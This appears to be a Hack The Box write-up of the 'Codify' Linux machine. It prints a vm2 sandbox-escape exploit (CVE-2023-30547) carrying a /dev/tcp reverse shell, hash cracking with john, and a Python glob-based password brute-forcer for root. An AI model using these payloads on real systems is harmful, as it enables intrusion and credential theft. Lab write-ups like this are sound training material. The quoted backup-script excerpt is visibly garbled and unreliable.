---
description: >-
  Difficulty: Easy OS: Linux (Ubuntu 22.04.3) Attack Path: Nmap → codify.htb
  Node.js sandbox → vm2 library sandbox escape (CVE-2023-30547) → reverse shell
  as svc → SQLite tickets.db → bcrypt hash → john
---

# Codify

## Overview

Codify is an Easy Linux machine running a Node.js code sandbox website. The sandbox uses the vm2 library version 3.9.16 which is vulnerable to a known sandbox escape. We break out of the sandbox to get a shell as svc. Exploring the web app files we find a SQLite database with a bcrypt hash for user joshua - crack it with john and SSH in. joshua can run a MySQL backup script as root via sudo. The script compares the root MySQL password using a bash conditional that is vulnerable to glob wildcard matching. We write a Python brute-forcer that leaks the password one character at a time. With the full password we switch to root.

## Enumeration

### Nmap

```
sudo nmap -p 22,80,3000,8000 -sV 10.10.11.239
```

![Nmap scan - ports 22 SSH, 80 Apache, 3000 Node.js, 8000 http-alt on codify.htb](<../../.gitbook/assets/Unknown image (355)>)

Open ports:

| Port | Service | Version                   |
| ---- | ------- | ------------------------- |
| 22   | SSH     | OpenSSH 8.9p1 Ubuntu      |
| 80   | HTTP    | Apache httpd 2.4.52       |
| 3000 | HTTP    | Node.js Express framework |
| 8000 | HTTP    | http-alt                  |

Add codify.htb to /etc/hosts and browse the website.

## Web Application

### The Codify Site

![codify.htb homepage - Node.js sandbox with Try it now button](<../../.gitbook/assets/Unknown image (356)>)

The site is called Codify and lets you test Node.js code in a sandbox. There is a code editor and an About Us page. The About Us page reveals the sandbox is powered by the **vm2 library version 3.9.16**.

This version is vulnerable to **CVE-2023-30547** - a sandbox escape via prototype chain manipulation that lets arbitrary code run outside the sandbox.

## Initial Access - vm2 Sandbox Escape (CVE-2023-30547)

### The Exploit

The vm2 sandbox escape works by manipulating the prototype chain of an Error object. When an error is thrown through a Proxy with a custom getPrototypeOf handler, the handler causes a stack overflow. In the catch block the constructor chain is walked up to process, giving access to the real Node.js process object outside the sandbox. From there require('child\_process').execSync runs any system command.

Paste the exploit into the Codify editor with a reverse shell payload embedded:

`const {VM} = require("vm2"); const vm = new VM(); const code = err = {}; const handler = { getPrototypeOf(target) { (function stack() { new Error().stack; stack(); })(); } }; const proxiedErr = new Proxy(err, handler); try { throw proxiedErr } catch ({constructor: c}) { c.constructor('return process')().mainModule .require('child_process') .execSync('bash -c "exec bash -i &>/dev/tcp/10.10.14.29/3355 <&1"') } ; console.log(vm.run(code));`

Set up a listener then run the code:

```
nc -nvlp 3355
```

![Reverse shell caught - svc@codify shell received, exploring filesystem](<../../.gitbook/assets/Unknown image (357)>)

Shell landed as **svc**. Navigate up the filesystem to explore.

## Finding Credentials - SQLite Database

Browse the web app directory:

```
cd /var/www
ls
# contact  editor  html

cd contact
ls
# index.js  package.json  package-lock.json  templates  tickets.db
```

![/var/www/contact listing - tickets.db found, sqlite3 query showing joshua hash](<../../.gitbook/assets/Unknown image (358)>)

Open the SQLite database:

```
sqlite3 tickets.db
.tables
# tickets  users
select * from users;
# 3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

Found user **joshua** with a **bcrypt** hash. Copy the hash to Kali.

***

## Cracking the Hash with John

```
john -w=rockyou.txt user.txt
```

![John cracking - bcrypt hash cracked to spongebob1, then SSH as joshua](<../../.gitbook/assets/Unknown image (359)>)

John cracks it:

```
joshua : spongebob1
```

SSH in:

```
ssh joshua@10.10.11.239
Password: spongebob1
```

Get the user flag from joshua home directory:

```
cat user.txt
```

## Privilege Escalation - sudo mysql-backup.sh Glob Wildcard Brute Force

### Checking sudo

```
sudo -l
```

Output: User joshua may run the following commands on codify: (root) /opt/scripts/mysql-backup.sh

### Reading the Script

```
cat /opt/scripts/mysql-backup.sh
```

![mysql-backup.sh source - reads root DB\_PASS from /root/.creds, compares with USER\_PASS using == in bash if](<../../.gitbook/assets/Unknown image (360)>)

Key section of the script:

```
DB_PASS=
read -s -p "Enter MySQL password for DB_USER: " USER_PASS
if [[  ==  ]]; then
    echo "Password confirmed!"
else
    echo "Password confirmation failed!"
    exit 1
fi
```

The critical flaw is the comparison: \[\[ == ]]

In bash double-bracket conditionals the right-hand side is treated as a **glob pattern** not a plain string. This means if USER\_PASS is a\* it matches any password starting with a. We can brute-force the password one character at a time by sending character\* and checking if "Password confirmed!" appears in the output.

### Python Brute-Force Script

Write this as brute.py:

```
import string
import subprocess

all_chars = list(string.ascii_letters + string.digits)
password = ""
found = False

while not found:
    for character in all_chars:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                text=True).stdout
        if "Password confirmed!" in output:
            password += character
            print(password)
            break
    else:
        found = True

print("Full password:", password)
```

Run it:

```
python3 brute.py
```

The script tests each character by appending \* and piping to the script as sudo. When the glob matches the real password the script prints "Password confirmed!" and we record that character then move on to the next position. After all characters are found the wildcard alone no longer gives a new match and the loop ends.

### Getting Root

With the recovered password switch to root:

```
su root
Password: <recovered_password>
```

![root@codify - ls /tmp shows linpeas pspy python root files, cat /root/root.txt gives flag](<../../.gitbook/assets/Unknown image (361)>)

```
cat /root/root.txt
{root flag here }
```

The /tmp directory also reveals the python.py script and other tools used - and file yosef/ZG9udG9wZW4K visible in /tmp confirming the brute force left artifacts.

Rooted!

## Summary

| Step               | Detail                                                      |
| ------------------ | ----------------------------------------------------------- |
| Nmap               | Ports 22, 80, 3000 (Node.js), 8000                          |
| vm2 CVE-2023-30547 | Sandbox escape via Proxy prototype chain → shell as svc     |
| SQLite DB          | /var/www/contact/tickets.db → joshua bcrypt hash            |
| John               | bcrypt cracked → spongebob1                                 |
| SSH                | joshua@codify.htb                                           |
| sudo               | /opt/scripts/mysql-backup.sh as root (NOPASSWD)             |
| Bash glob bug      | \[\[ DB\_PASS == USER\_PASS\* ]] → char-by-char brute force |
| su root            | Password recovered via glob matching → root                 |

## Key Takeaways

* Always check the About Us or documentation pages - the vm2 version disclosure was the whole foothold
* CVE-2023-30547 is a beautiful sandbox escape - vm2 was a widely used library so this had real-world impact
* SQLite databases in web app directories are easy to miss - always look in the full web root
* Bcrypt is strong but rockyou still cracks weak passwords like spongebob1
* Bash \[\[ ]] glob matching on the right side of == is a lesser-known feature that becomes a vulnerability
* The glob brute force is elegant - it leaks the password one character at a time without any rate limiting

&#x20;_Platform: Hack The Box_
